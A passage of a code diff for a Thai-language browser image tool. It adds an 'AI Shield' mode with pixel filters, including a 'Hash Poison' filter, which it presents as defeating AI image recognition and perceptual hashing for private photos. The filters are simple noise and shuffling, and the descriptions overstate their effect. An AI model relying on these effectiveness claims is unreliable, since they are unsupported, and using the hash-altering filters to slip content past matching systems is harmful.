+                <p style="margin-top:10px;color:#ff6666;text-align:center;font-weight:bold">คุณเข้าใจและยอมรับการใช้งานเครื่องมือนี้หรือไม่?</p>
+            </div>
+            <div class="warning-actions">
+                <button class="btn ghost" onclick="closeWarning(false)">❌ ยกเลิก</button>
+                <button class="btn danger" onclick="closeWarning(true)">✅ เข้าใจและยอมรับ</button>
+            </div>
+        </div>
+    </div>
 
-            // Add circle around the pin
-            L.circle([TARGET_LAT, TARGET_LNG], {
-                color: '#ff6b6b',
-                fillColor: '#ff6b6b',
-                fillOpacity: 0.15,
-                radius: 200
-            }).addTo(map);
+    <div class="loading-overlay" id="loadingOverlay"><div class="spinner"></div><div style="color:#666;font-size:0.85rem">กำลังประมวลผล...</div></div>
+    <div class="toast" id="toast"></div>
+
+<script>
+// ==================== STATE ====================
+let img=null, sourceCanvas=null, sourceCtx=null, sourceData=null, shieldData=null;
+let frameW=64, frameH=64, pixelScale=12, gap=1, zoom=1, brightness=1.0;
+let offsetX=0, offsetY=0;
+let isDragging=false, dragStartX=0, dragStartY=0, dragOffX=0, dragOffY=0;
+let currentMode='normal', currentTab='ansi';
+let shieldMode=false, compareMode=false, shieldAccepted=false;
+
+const MODES = {
+    normal: { name:'🎨 Normal', desc:'โหมดปกติ: แสดงภาพ RGB Subpixel แบบจอมือถือ มองไกลๆ จะเห็นภาพชัด' },
+    phase: { name:'🌊 Phase Scramble', desc:'สลับตำแหน่ง pixel ตาม phase สุ่ม: AI เห็นเป็น noise แต่มนุษย์ละสายตาแล้วเห็นภาพ' },
+    shuffle: { name:'🔀 Block Shuffle', desc:'สลับ pixel ภายในแต่ละบล็อก: ทำลาย spatial relationship ที่ AI ใช้ recognize' },
+    adversarial: { name:'👁️ Adversarial', desc:'ใส่ high-frequency noise ตาม edge: ทำลาย feature map ของ AI แต่มนุษย์ยังเห็นภาพ' },
+    edgebreak: { name:'⚡ Edge Break', desc:'แทรกสีตรงข้ามตามขอบภาพ: AI ตรวจจับ edge ไม่เจอ แต่สมองมนุษย์รวมภาพได้' },
+    deepmask: { name:'🎭 Deep Mask', desc:'ซ่อนภาพใน checkerboard pattern: AI เห็นเป็น texture ธรรมดา' },
+    scatter: { name:'💫 RGB Scatter', desc:'กระจายแต่ละ channel ไปคนละทิศ: ภาพดู 3D/เบลอ แต่ยังเห็นรูปร่าง' },
+    noisegrid: { name:'🧩 Noise Grid', desc:'แบ่งกริดแล้วใส่ noise แบบสลับระดับ: ทำลาย consistency ของ AI' }
+};
+
+const SHIELD_TECHS = {
+    gradient: { name:'Gradient Masking', desc:'ใส่ noise ตาม gradient ของภาพ ทำลาย feature detection ของ AI แต่ตามนุษย์ยังเห็นภาพ' },
+    dct: { name:'DCT Perturbation', desc:'แก้ไข DCT coefficients เหมือน JPEG artifact แต่ targeted ให้ AI อ่านผิด' },
+    patch: { name:'Patch Randomize', desc:'สลับ patch ขนาดเล็กภายในกริด ทำลาย spatial coherence ที่ AI ใช้วิเคราะห์' },
+    chromatic: { name:'Chromatic Shift', desc:'แยก RGB channels คนละทิศทางแบบ lens distortion ทำให้ AI สับสนใน color space' },
+    freq: { name:'Frequency Split', desc:'แยก low/high frequency แล้วประมวลผลแยก ทำลาย frequency signature ของ AI' },
+    hash: { name:'Hash Poison', desc:'ใส่ noise ที่เปลี่ยน perceptual hash (pHash) แต่ตามนุษย์แทบไม่เห็นต่าง' },
+    mosaic: { name:'Smart Mosaic', desc:'mosaic แบบ adaptive ที่ตามนุษย์ยังพอเห็นรูปร่าง แต่ AI อ่านไม่ออก' },
+    glitch: { name:'Glitch Burst', desc:'แทรกข้อมูล glitch แบบสุ่มตำแหน่ง ทำลาย byte pattern ที่ AI ใช้ scan' }
+};
+
+// ==================== DOM ====================
+const canvas=document.getElementById('mainCanvas');
+const ctx=canvas.getContext('2d',{alpha:false});
+const infoBar=document.getElementById('infoBar');
+const hintBadge=document.getElementById('hintBadge');
+const toast=document.getElementById('toast');
+
+// ==================== INIT ====================
+function init(){
+    sourceCanvas=document.createElement('canvas');
+    sourceCtx=sourceCanvas.getContext('2d',{willReadFrequently:true});
+    resizeCanvas();
+    render();
+    updateShieldDesc();
+}
+function resizeCanvas(){
+    canvas.width=frameW*pixelScale;
+    canvas.height=frameH*pixelScale;
+    sourceCanvas.width=frameW;
+    sourceCanvas.height=frameH;
+}
+
+// ==================== IMAGE ====================
+document.getElementById('fileInput').addEventListener('change',(e)=>{
+    const file=e.target.files[0]; if(!file)return;
+    showLoading(true);
+    const reader=new FileReader();
+    reader.onload=(ev)=>{
+        img=new Image();
+        img.onload=()=>{
+            if(document.getElementById('autoSize').checked){
+                frameW=Math.min(img.width,128); frameH=Math.min(img.height,128);
+                document.getElementById('frameWidth').value=frameW;
+                document.getElementById('frameHeight').value=frameH;
+            }
+            resetTransform(); shieldData=null; compareMode=false; updateCompareBtn(); resizeCanvas(); render(); showLoading(false); showToast('โหลดภาพสำเร็จ!');
+        };
+        img.src=ev.target.result;
+    };
+    reader.readAsDataURL(file);
+});
+
+// ==================== CONTROLS ====================
+document.getElementById('frameWidth').addEventListener('change',(e)=>{ frameW=Math.min(256,Math.max(8,parseInt(e.target.value)||64)); e.target.value=frameW; resizeCanvas(); render(); });
+document.getElementById('frameHeight').addEventListener('change',(e)=>{ frameH=Math.min(256,Math.max(8,parseInt(e.target.value)||64)); e.target.value=frameH; resizeCanvas(); render(); });
+document.getElementById('autoSize').addEventListener('change',()=>{ if(document.getElementById('autoSize').checked&&img){ frameW=Math.min(img.width,128); frameH=Math.min(img.height,128); document.getElementById('frameWidth').value=frameW; document.getElementById('frameHeight').value=frameH; resizeCanvas(); render(); } });
+document.getElementById('pixelScale').addEventListener('input',(e)=>{ pixelScale=parseInt(e.target.value); document.getElementById('pixelScaleVal').textContent=pixelScale; resizeCanvas(); render(); });
+document.getElementById('gap').addEventListener('input',(e)=>{ gap=parseInt(e.target.value); document.getElementById('gapVal').textContent=gap; render(); });
+document.getElementById('zoomSlider').addEventListener('input',(e)=>{ zoom=parseFloat(e.target.value); document.getElementById('zoomVal').textContent=zoom.toFixed(1); clampOffset(); render(); });
+document.getElementById('brightness').addEventListener('input',(e)=>{ brightness=parseInt(e.target.value)/100; document.getElementById('brightnessVal').textContent=e.target.value; render(); });
+document.getElementById('resetBtn').addEventListener('click',()=>{ resetTransform(); showToast('รีเซ็ตตำแหน่งแล้ว'); });
+document.getElementById('fitBtn').addEventListener('click',()=>{ fitToImage(); showToast('ปรับให้พอดีเฟรมแล้ว'); });
+
+function resetTransform(){ offsetX=0; offsetY=0; zoom=1; document.getElementById('zoomSlider').value=1; document.getElementById('zoomVal').textContent='1.0'; render(); }
+function fitToImage(){ if(!img)return; zoom=Math.min(frameW/img.width,frameH/img.height,1); offsetX=0; offsetY=0; document.getElementById('zoomSlider').value=zoom; document.getElementById('zoomVal').textContent=zoom.toFixed(1); render(); }
+
+// ==================== MODE ====================
+function setMode(mode){
+    if(shieldMode) exitShieldMode();
+    currentMode=mode;
+    document.querySelectorAll('.mode-panel .btn').forEach(b=>{ b.classList.remove('active-mode'); if(!b.classList.contains('danger')) b.classList.add('ghost'); });
+    const btn=document.querySelector(`.mode-panel .btn[data-mode="${mode}"]`);
+    if(btn){ btn.classList.add('active-mode'); btn.classList.remove('ghost'); }
+    document.getElementById('modeDesc').textContent=MODES[mode].desc;
+    render();
+}
+
+// ==================== SHIELD MODE ====================
+function enterShieldMode(){
+    if(!shieldAccepted){ document.getElementById('warningModal').classList.add('active'); return; }
+    shieldMode=true;
+    document.querySelectorAll('.mode-panel .btn').forEach(b=>b.classList.remove('active-mode'));
+    document.querySelector('.mode-panel .btn[data-mode="shield"]').classList.add('active-mode');
+    document.getElementById('shieldPanel').classList.add('active');
+    document.getElementById('shieldDescPanel').style.display='flex';
+    document.getElementById('modeDesc').textContent='🛡️ AI Shield Mode: ป้องกันการตรวจจับโดย AI สำหรับรูปภาพส่วนตัว';
+    document.getElementById('compareToggle').style.display='flex';
+    render();
+}
+
+function exitShieldMode(){
+    shieldMode=false;
+    document.getElementById('shieldPanel').classList.remove('active');
+    document.getElementById('shieldDescPanel').style.display='none';
+    document.getElementById('compareToggle').style.display='none';
+    compareMode=false; updateCompareBtn();
+}
+
+function closeWarning(accepted){
+    document.getElementById('warningModal').classList.remove('active');
+    if(accepted){ shieldAccepted=true; enterShieldMode(); }
+}
+
+function updateShieldDesc(){
+    const tech=document.getElementById('shieldTechnique').value;
+    const t=SHIELD_TECHS[tech];
+    document.getElementById('shieldTechName').textContent=t.name;
+    document.getElementById('shieldTechDesc').textContent=t.desc;
+}
+
+document.getElementById('shieldStrength').addEventListener('input',(e)=>{
+    document.getElementById('shieldStrengthVal').textContent=e.target.value;
+});
+
+function toggleCompare(){
+    compareMode=!compareMode;
+    updateCompareBtn();
+    render();
+}
+function updateCompareBtn(){
+    const btn=document.getElementById('compareToggle');
+    if(compareMode){ btn.classList.add('active'); btn.textContent='👁 ดูผลลัพธ์'; }
+    else { btn.classList.remove('active'); btn.textContent='👁 ดูต้นฉบับ'; }
+}
+
+// ==================== MOUSE / TOUCH ====================
+canvas.addEventListener('mousedown',(e)=>{ if(!img)return; isDragging=true; dragStartX=e.clientX; dragStartY=e.clientY; dragOffX=offsetX; dragOffY=offsetY; });
+window.addEventListener('mousemove',(e)=>{ if(!isDragging||!img)return; const dx=(e.clientX-dragStartX)/zoom; const dy=(e.clientY-dragStartY)/zoom; offsetX=dragOffX-dx; offsetY=dragOffY-dy; clampOffset(); render(); });
+window.addEventListener('mouseup',()=>{ isDragging=false; });
+canvas.addEventListener('wheel',(e)=>{ e.preventDefault(); if(!img)return; const delta=e.deltaY>0?0.9:1.1; zoom=Math.max(0.1,Math.min(10,zoom*delta)); document.getElementById('zoomSlider').value=zoom; document.getElementById('zoomVal').textContent=zoom.toFixed(1); clampOffset(); render(); },{passive:false});
+
+let lastTouchDist=0, touchZoomStart=1;
+canvas.addEventListener('touchstart',(e)=>{
+    if(e.touches.length===1){ isDragging=true; dragStartX=e.touches[0].clientX; dragStartY=e.touches[0].clientY; dragOffX=offsetX; dragOffY=offsetY; }
+    else if(e.touches.length===2){ isDragging=false; lastTouchDist=Math.hypot(e.touches[0].clientX-e.touches[1].clientX,e.touches[0].clientY-e.touches[1].clientY); touchZoomStart=zoom; }
+},{passive:false});
+canvas.addEventListener('touchmove',(e)=>{
+    e.preventDefault(); if(!img)return;
+    if(e.touches.length===1&&isDragging){ const t=e.touches[0]; const dx=(t.clientX-dragStartX)/zoom; const dy=(t.clientY-dragStartY)/zoom; offsetX=dragOffX-dx; offsetY=dragOffY-dy; clampOffset(); render(); }
+    else if(e.touches.length===2){ const dist=Math.hypot(e.touches[0].clientX-e.touches[1].clientX,e.touches[0].clientY-e.touches[1].clientY); zoom=Math.max(0.1,Math.min(10,touchZoomStart*(dist/lastTouchDist))); document.getElementById('zoomSlider').value=zoom; document.getElementById('zoomVal').textContent=zoom.toFixed(1); clampOffset(); render(); }
+},{passive:false});
+canvas.addEventListener('touchend',()=>{ isDragging=false; });
+function clampOffset(){ if(!img)return; const srcW=frameW/zoom, srcH=frameH/zoom; offsetX=Math.max(0,Math.min(Math.max(0,img.width-srcW),offsetX)); offsetY=Math.max(0,Math.min(Math.max(0,img.height-srcH),offsetY)); }
+
+// ==================== RENDER CORE ====================
+function render(){
+    const modeText=shieldMode?'SHIELD':currentMode.toUpperCase();
+    infoBar.textContent=`${frameW}×${frameH} | ${zoom.toFixed(1)}x | ${modeText}`;
+    const cw=canvas.width, ch=canvas.height;
+    ctx.fillStyle='#000000'; ctx.fillRect(0,0,cw,ch);
+    if(!img){ drawPlaceholder(); return; }
+
+    // Sample to source
+    const srcW=frameW/zoom, srcH=frameH/zoom;
+    let sx=offsetX, sy=offsetY, sw=srcW, sh=srcH;
+    if(img.width<sw){ sx=0; sw=img.width; }
+    if(img.height<sh){ sy=0; sh=img.height; }
+    sourceCtx.clearRect(0,0,frameW,frameH);
+    sourceCtx.drawImage(img,sx,sy,sw,sh,0,0,frameW,frameH);
+    try{ sourceData=sourceCtx.getImageData(0,0,frameW,frameH); }catch(e){ return; }
+
+    let processed;
+    if(shieldMode&&shieldData){
+        if(compareMode) processed=sourceData; else processed=shieldData;
+    } else {
+        processed = processMode(sourceData, currentMode);
+    }
+    drawToCanvas(processed);
+}
+
+function drawPlaceholder(){
+    const cw=canvas.width, ch=canvas.height;
+    const outData=ctx.createImageData(cw,ch);
+    const out=outData.data;
+    const ps=pixelScale, spw=Math.floor(ps/3);
+    for(let fy=0;fy<frameH;fy++){
+        for(let fx=0;fx<frameW;fx++){
+            const bx=fx*ps, by=fy*ps;
+            for(let py=0;py<ps;py++){
+                for(let px=0;px<ps;px++){
+                    const cx=bx+px, cy=by+py;
+                    if(cx>=cw||cy>=ch)continue;
+                    const o=(cy*cw+cx)*4;
+                    if(px<spw){ out[o]=40; out[o+1]=0; out[o+2]=0; out[o+3]=255; }
+                    else if(px<spw*2){ out[o]=0; out[o+1]=40; out[o+2]=0; out[o+3]=255; }
+                    else { out[o]=0; out[o+1]=0; out[o+2]=40; out[o+3]=255; }
+                }
+            }
         }
-    </script>
+    }
+    ctx.putImageData(outData,0,0);
+}
+
+function drawToCanvas(data){
+    const cw=canvas.width, ch=canvas.height;
+    const outData=ctx.createImageData(cw,ch);
+    const out=outData.data;
+    const d=data.data;
+    const ps=pixelScale, g=gap, spw=Math.floor(ps/3), br=brightness;
+    for(let i=0;i<out.length;i+=4){ out[i]=0; out[i+1]=0; out[i+2]=0; out[i+3]=255; }
+    for(let fy=0;fy<frameH;fy++){
+        for(let fx=0;fx<frameW;fx++){
+            const idx=(fy*frameW+fx)*4;
+            const r=Math.min(255,Math.round(d[idx]*br));
+            const gv=Math.min(255,Math.round(d[idx+1]*br));
+            const b=Math.min(255,Math.round(d[idx+2]*br));
+            const bx=fx*ps, by=fy*ps;
+            for(let py=g;py<ps-g;py++){
+                for(let px=g;px<ps-g;px++){
+                    const cx=bx+px, cy=by+py;
+                    if(cx>=cw||cy>=ch)continue;
+                    const o=(cy*cw+cx)*4;
+                    if(px<spw){ out[o]=r; out[o+1]=0; out[o+2]=0; out[o+3]=255; }
+                    else if(px<spw*2){ out[o]=0; out[o+1]=gv; out[o+2]=0; out[o+3]=255; }
+                    else { out[o]=0; out[o+1]=0; out[o+2]=b; out[o+3]=255; }
+                }
+            }
+        }
+    }
+    ctx.putImageData(outData,0,0);
+}
+
+// ==================== MODE PROCESSORS ====================
+function processMode(src, mode){
+    if(mode==='normal') return src;
+    const w=src.width, h=src.height;
+    const out=ctx.createImageData(w,h);
+    const s=src.data, d=out.data;
+    for(let i=0;i<s.length;i++) d[i]=s[i];
+    switch(mode){
+        case 'phase': processPhase(s,d,w,h); break;
+        case 'shuffle': processShuffle(s,d,w,h); break;
+        case 'adversarial': processAdversarial(s,d,w,h); break;
+        case 'edgebreak': processEdgeBreak(s,d,w,h); break;
+        case 'deepmask': processDeepMask(s,d,w,h); break;
+        case 'scatter': processScatter(s,d,w,h); break;
+        case 'noisegrid': processNoiseGrid(s,d,w,h); break;
+    }
+    return out;
+}
+
+function processPhase(s,d,w,h){
+    const seed=12345, strength=0.7;
+    const temp=new Uint8ClampedArray(s.length);
+    for(let i=0;i<s.length;i++) temp[i]=s[i];
+    for(let y=0;y<h;y++){
+        for(let x=0;x<w;x++){
+            const i=(y*w+x)*4;
+            const angle=(Math.sin(x*0.3+seed)*Math.cos(y*0.3+seed)*Math.PI*2)*strength;
+            const dx=Math.round(Math.sin(angle)*3), dy=Math.round(Math.cos(angle)*3);
+            const sx=Math.max(0,Math.min(w-1,x+dx)), sy=Math.max(0,Math.min(h-1,y+dy));
+            const si=(sy*w+sx)*4;
+            const blend=0.6;
+            d[i]=Math.round(temp[i]*blend+temp[si]*(1-blend));
+            d[i+1]=Math.round(temp[i+1]*blend+temp[si+1]*(1-blend));
+            d[i+2]=Math.round(temp[i+2]*blend+temp[si+2]*(1-blend));
+            d[i+3]=255;
+        }
+    }
+}
+function processShuffle(s,d,w,h){
+    const block=8;
+    for(let by=0;by<h;by+=block){
+        for(let bx=0;bx<w;bx+=block){
+            const bh=Math.min(block,h-by), bw=Math.min(block,w-bx);
+            const pixels=[];
+            for(let y=0;y<bh;y++){
+                for(let x=0;x<bw;x++){
+                    const i=((by+y)*w+(bx+x))*4;
+                    pixels.push([s[i],s[i+1],s[i+2]]);
+                }
+            }
+            let seed=bx*374761+by*668265+12345;
+            const rng=()=>{ seed=(seed*16807)%2147483647; return (seed-1)/2147483646; };
+            for(let i=pixels.length-1;i>0;i--){
+                const j=Math.floor(rng()*(i+1));
+                [pixels[i],pixels[j]]=[pixels[j],pixels[i]];
+            }
+            let pi=0;
+            for(let y=0;y<bh;y++){
+                for(let x=0;x<bw;x++){
+                    const i=((by+y)*w+(bx+x))*4;
+                    d[i]=pixels[pi][0]; d[i+1]=pixels[pi][1]; d[i+2]=pixels[pi][2]; d[i+3]=255;
+                    pi++;
+                }
+            }
+        }
+    }
+}
+function processAdversarial(s,d,w,h){
+    const noiseAmp=40;
+    for(let y=1;y<h-1;y++){
+        for(let x=1;x<w-1;x++){
+            const i=(y*w+x)*4;
+            const up=(y*w+x)*4, down=((y+1)*w+x)*4, left=(y*w+(x-1))*4, right=(y*w+(x+1))*4;
+            const gy=Math.abs(s[up]-s[down])+Math.abs(s[up+1]-s[down+1])+Math.abs(s[up+2]-s[down+2]);
+            const gx=Math.abs(s[left]-s[right])+Math.abs(s[left+1]-s[right+1])+Math.abs(s[left+2]-s[right+2]);
+            const grad=Math.min(1,(gx+gy)/300);
+            const n=(Math.random()-0.5)*noiseAmp*grad;
+            d[i]=Math.max(0,Math.min(255,s[i]+n));
+            d[i+1]=Math.max(0,Math.min(255,s[i+1]+n));
+            d[i+2]=Math.max(0,Math.min(255,s[i+2]+n));
+            d[i+3]=255;
+        }
+    }
+    for(let y=0;y<h;y++){ for(let x=0;x<w;x++){ if(x===0||x===w-1||y===0||y===h-1){ const i=(y*w+x)*4; d[i]=s[i]; d[i+1]=s[i+1]; d[i+2]=s[i+2]; d[i+3]=255; } } }
+}
+function processEdgeBreak(s,d,w,h){
+    const threshold=30;
+    for(let y=1;y<h-1;y++){
+        for(let x=1;x<w-1;x++){
+            const i=(y*w+x)*4;
+            const left=(y*w+(x-1))*4, right=(y*w+(x+1))*4, up=((y-1)*w+x)*4, down=((y+1)*w+x)*4;
+            const diffH=Math.abs(s[i]-s[left])+Math.abs(s[i+1]-s[left+1])+Math.abs(s[i+2]-s[left+2]);
+            const diffV=Math.abs(s[i]-s[up])+Math.abs(s[i+1]-s[up+1])+Math.abs(s[i+2]-s[up+2]);
+            if(diffH>threshold||diffV>threshold){
+                d[i]=255-s[i]; d[i+1]=255-s[i+1]; d[i+2]=255-s[i+2]; d[i+3]=255;
+            } else {
+                d[i]=s[i]; d[i+1]=s[i+1]; d[i+2]=s[i+2]; d[i+3]=255;
+            }
+        }
+    }
+}
+function processDeepMask(s,d,w,h){
+    const check=4;
+    for(let y=0;y<h;y++){
+        for(let x=0;x<w;x++){
+            const i=(y*w+x)*4;
+            const cx=Math.floor(x/check), cy=Math.floor(y/check);
+            if(((cx+cy)%2===0)){
+                d[i]=s[i]; d[i+1]=s[i+1]; d[i+2]=s[i+2]; d[i+3]=255;
+            } else {
+                const noise=((x*73+y*37)%40)-20;
+                d[i]=Math.max(0,Math.min(255,s[i]+noise));
+                d[i+1]=Math.max(0,Math.min(255,s[i+1]+noise));
+                d[i+2]=Math.max(0,Math.min(255,s[i+2]+noise));
+                d[i+3]=255;
+            }
+        }
+    }
+}
+function processScatter(s,d,w,h){
+    const shift=2;
+    for(let y=0;y<h;y++){
+        for(let x=0;x<w;x++){
+            const i=(y*w+x)*4;
+            const rx=Math.max(0,Math.min(w-1,x-shift)), ry=Math.max(0,Math.min(h-1,y));
+            const gx=Math.max(0,Math.min(w-1,x)), gy=Math.max(0,Math.min(h-1,y));
+            const bx=Math.max(0,Math.min(w-1,x+shift)), by=Math.max(0,Math.min(h-1,y));
+            const ri=(ry*w+rx)*4, gi=(gy*w+gx)*4, bi=(by*w+bx)*4;
+            d[i]=s[ri]; d[i+1]=s[gi+1]; d[i+2]=s[bi+2]; d[i+3]=255;
+        }
+    }
+}
+function processNoiseGrid(s,d,w,h){
+    const cell=6;
+    for(let cy=0;cy<h;cy+=cell){
+        for(let cx=0;cx<w;cx+=cell){
+            const ch=Math.min(cell,h-cy), cw=Math.min(cell,w-cx);
+            const level=(Math.sin(cx)*Math.cos(cy)*0.5+0.5)*60;
+            for(let y=0;y<ch;y++){
+                for(let x=0;x<cw;x++){
+                    const i=((cy+y)*w+(cx+x))*4;
+                    const n=(Math.random()-0.5)*level;
+                    d[i]=Math.max(0,Math.min(255,s[i]+n));
+                    d[i+1]=Math.max(0,Math.min(255,s[i+1]+n));
+                    d[i+2]=Math.max(0,Math.min(255,s[i+2]+n));
+                    d[i+3]=255;
+                }
+            }
+        }
+    }
+}
+
+// ==================== AI SHIELD PROCESSORS ====================
+function applyShield(){
+    if(!sourceData){ showToast('กรุณาอัปโหลดภาพก่อน'); return; }
+    showLoading(true);
+    setTimeout(()=>{
+        const tech=document.getElementById('shieldTechnique').value;
+        const strength=parseInt(document.getElementById('shieldStrength').value);
+        const block=parseInt(document.getElementById('shieldBlock').value);
+        const seed=parseInt(document.getElementById('shieldSeed').value);
+        const w=sourceData.width, h=sourceData.height;
+        const out=ctx.createImageData(w,h);
+        const s=sourceData.data, d=out.data;
+        for(let i=0;i<s.length;i++) d[i]=s[i];
+
+        switch(tech){
+            case 'gradient': shieldGradient(s,d,w,h,strength); break;
+            case 'dct': shieldDCT(s,d,w,h,strength,block); break;
+            case 'patch': shieldPatch(s,d,w,h,strength,block,seed); break;
+            case 'chromatic': shieldChromatic(s,d,w,h,strength); break;
+            case 'freq': shieldFreq(s,d,w,h,strength); break;
+            case 'hash': shieldHash(s,d,w,h,strength,seed); break;
+            case 'mosaic': shieldMosaic(s,d,w,h,strength,block); break;
+            case 'glitch': shieldGlitch(s,d,w,h,strength,seed); break;
+        }
+        shieldData=out;
+        compareMode=false; updateCompareBtn();
+        render();
+        showLoading(false);
+        showToast('ประมวลผล AI Shield สำเร็จ!');
+    },50);
+}
+
+function resetShield(){
+    shieldData=null;
+    compareMode=false; updateCompareBtn();
+    render();
+    showToast('รีเซ็ต AI Shield');
+}
+
+// 1. Gradient Masking: noise proportional to local gradient
+function shieldGradient(s,d,w,h,strength){
+    const amp=strength*0.8;
+    for(let y=1;y<h-1;y++){
+        for(let x=1;x<w-1;x++){
+            const i=(y*w+x)*4;
+            const u=((y-1)*w+x)*4, dn=((y+1)*w+x)*4, l=(y*w+(x-1))*4, r=(y*w+(x+1))*4;
+            const gy=Math.abs(s[u]-s[dn])+Math.abs(s[u+1]-s[dn+1])+Math.abs(s[u+2]-s[dn+2]);
+            const gx=Math.abs(s[l]-s[r])+Math.abs(s[l+1]-s[r+1])+Math.abs(s[l+2]-s[r+2]);
+            const grad=Math.min(1,(gx+gy)/400);
+            const n1=(Math.sin(x*0.7+y*0.3)*amp*grad);
+            const n2=(Math.cos(x*0.3+y*0.7)*amp*grad);
+            const n3=(Math.sin(x*0.5+y*0.5)*amp*grad);
+            d[i]=Math.max(0,Math.min(255,s[i]+n1));
+            d[i+1]=Math.max(0,Math.min(255,s[i+1]+n2));
+            d[i+2]=Math.max(0,Math.min(255,s[i+2]+n3));
+            d[i+3]=255;
+        }
+    }
+}
+
+// 2. DCT Perturbation: simulate JPEG artifact targeting
+function shieldDCT(s,d,w,h,strength,block){
+    const amp=strength*0.5;
+    for(let by=0;by<h;by+=block){
+        for(let bx=0;bx<w;bx+=block){
+            const bh=Math.min(block,h-by), bw=Math.min(block,w-bx);
+            // Simple DCT-like energy estimation and perturbation
+            let energy=0;
+            for(let y=0;y<bh;y++){
+                for(let x=0;x<bw;x++){
+                    const i=((by+y)*w+(bx+x))*4;
+                    energy+=(s[i]+s[i+1]+s[i+2])/3;
+                }
+            }
+            energy/=(bh*bw);
+            const perturb=(energy/255)*amp;
+            for(let y=0;y<bh;y++){
+                for(let x=0;x<bw;x++){
+                    const i=((by+y)*w+(bx+x))*4;
+                    const n=(Math.sin(bx*0.1+by*0.1+x*0.5+y*0.5)-0.5)*perturb*2;
+                    d[i]=Math.max(0,Math.min(255,s[i]+n));
+                    d[i+1]=Math.max(0,Math.min(255,s[i+1]+n));
+                    d[i+2]=Math.max(0,Math.min(255,s[i+2]+n));
+                    d[i+3]=255;
+                }
+            }
+        }
+    }
+}
+
+// 3. Patch Randomize: shuffle patches with seeded RNG
+function shieldPatch(s,d,w,h,strength,block,seed){
+    const swapProb=strength/100;
+    let rng=seed;
+    const next=()=>{ rng=(rng*16807)%2147483647; return (rng-1)/2147483646; };
+    for(let by=0;by<h;by+=block){
+        for(let bx=0;bx<w;bx+=block){
+            const bh=Math.min(block,h-by), bw=Math.min(block,w-bx);
+            if(next()>swapProb) continue;
+            // swap with random neighbor patch
+            const nbx=Math.min(w-bw,Math.max(0,bx+Math.floor((next()-0.5)*block*4)));
+            const nby=Math.min(h-bh,Math.max(0,by+Math.floor((next()-0.5)*block*4)));
+            for(let y=0;y<bh;y++){
+                for(let x=0;x<bw;x++){
+                    const si=((by+y)*w+(bx+x))*4;
+                    const di=((nby+y)*w+(nbx+x))*4;
+                    const blend=0.5+strength/200;
+                    d[si]=Math.round(s[si]*blend+s[di]*(1-blend));
+                    d[si+1]=Math.round(s[si+1]*blend+s[di+1]*(1-blend));
+                    d[si+2]=Math.round(s[si+2]*blend+s[di+2]*(1-blend));
+                    d[si+3]=255;
+                }
+            }
+        }
+    }
+}
+
+// 4. Chromatic Shift: separate RGB channels
+function shieldChromatic(s,d,w,h,strength){
+    const shift=Math.max(1,Math.floor(strength/15));
+    for(let y=0;y<h;y++){
+        for(let x=0;x<w;x++){
+            const i=(y*w+x)*4;
+            const rx=Math.max(0,Math.min(w-1,x-shift));
+            const gx=Math.max(0,Math.min(w-1,x));
+            const bx=Math.max(0,Math.min(w-1,x+shift));
+            const ri=(y*w+rx)*4, gi=(y*w+gx)*4, bi=(y*w+bx)*4;
+            d[i]=s[ri]; d[i+1]=s[gi+1]; d[i+2]=s[bi+2]; d[i+3]=255;
+        }
+    }
+}
+
+// 5. Frequency Split: separate low and high frequency
+function shieldFreq(s,d,w,h,strength){
+    const amp=strength*0.6;
+    // Blur copy (low freq)
+    const low=new Uint8ClampedArray(s.length);
+    for(let y=0;y<h;y++){
+        for(let x=0;x<w;x++){
+            const i=(y*w+x)*4;
+            let r=0,g=0,b=0,c=0;
+            for(let dy=-1;dy<=1;dy++){
+                for(let dx=-1;dx<=1;dx++){
+                    const ny=Math.max(0,Math.min(h-1,y+dy));
+                    const nx=Math.max(0,Math.min(w-1,x+dx));
+                    const ni=(ny*w+nx)*4;
+                    r+=s[ni]; g+=s[ni+1]; b+=s[ni+2]; c++;
+                }
+            }
+            low[i]=r/c; low[i+1]=g/c; low[i+2]=b/c; low[i+3]=255;
+        }
+    }
+    // High freq = original - low, then perturb
+    for(let y=0;y<h;y++){
+        for(let x=0;x<w;x++){
+            const i=(y*w+x)*4;
+            const hfR=s[i]-low[i];
+            const hfG=s[i+1]-low[i+1];
+            const hfB=s[i+2]-low[i+2];
+            const noise=(Math.sin(x*0.9+y*0.4)*amp);
+            d[i]=Math.max(0,Math.min(255,low[i]+hfR+noise));
+            d[i+1]=Math.max(0,Math.min(255,low[i+1]+hfG+noise));
+            d[i+2]=Math.max(0,Math.min(255,low[i+2]+hfB+noise));
+            d[i+3]=255;
+        }
+    }
+}
+
+// 6. Hash Poison: minimal noise that changes pHash significantly
+function shieldHash(s,d,w,h,strength,seed){
+    const amp=strength*0.3;
+    let rng=seed;
+    const next=()=>{ rng=(rng*16807)%2147483647; return (rng-1)/2147483646; };
+    // Target specific frequency bands
+    for(let y=0;y<h;y++){
+        for(let x=0;x<w;x++){
+            const i=(y*w+x)*4;
+            const phase=(x+y)*0.3+seed;
+            const n1=Math.sin(phase)*amp*(next());
+            const n2=Math.cos(phase)*amp*(next());
+            const n3=Math.sin(phase+1)*amp*(next());
+            d[i]=Math.max(0,Math.min(255,s[i]+n1));
+            d[i+1]=Math.max(0,Math.min(255,s[i+1]+n2));
+            d[i+2]=Math.max(0,Math.min(255,s[i+2]+n3));
+            d[i+3]=255;
+        }
+    }
+}
+
+// 7. Smart Mosaic: adaptive mosaic
+function shieldMosaic(s,d,w,h,strength,block){
+    const b=Math.max(2,Math.floor(block*(strength/100)));
+    for(let by=0;by<h;by+=b){
+        for(let bx=0;bx<w;bx+=b){
+            const bh=Math.min(b,h-by), bw=Math.min(b,w-bx);
+            let r=0,g=0,bv=0,c=0;
+            for(let y=0;y<bh;y++){
+                for(let x=0;x<bw;x++){
+                    const i=((by+y)*w+(bx+x))*4;
+                    r+=s[i]; g+=s[i+1]; bv+=s[i+2]; c++;
+                }
+            }
+            r/=c; g/=c; bv/=c;
+            // Add slight variation to avoid uniform blocks
+            const noise=(strength/100)*20;
+            r+=Math.sin(bx*0.5+by*0.3)*noise;
+            g+=Math.cos(bx*0.3+by*0.5)*noise;
+            bv+=Math.sin(bx*0.7+by*0.2)*noise;
+            for(let y=0;y<bh;y++){
+                for(let x=0;x<bw;x++){
+                    const i=((by+y)*w+(bx+x))*4;
+                    d[i]=Math.max(0,Math.min(255,r));
+                    d[i+1]=Math.max(0,Math.min(255,g));
+                    d[i+2]=Math.max(0,Math.min(255,bv));
+                    d[i+3]=255;
+                }
+            }
+        }
+    }
+}
+
+// 8. Glitch Burst: random byte-level corruption
+function shieldGlitch(s,d,w,h,strength,seed){
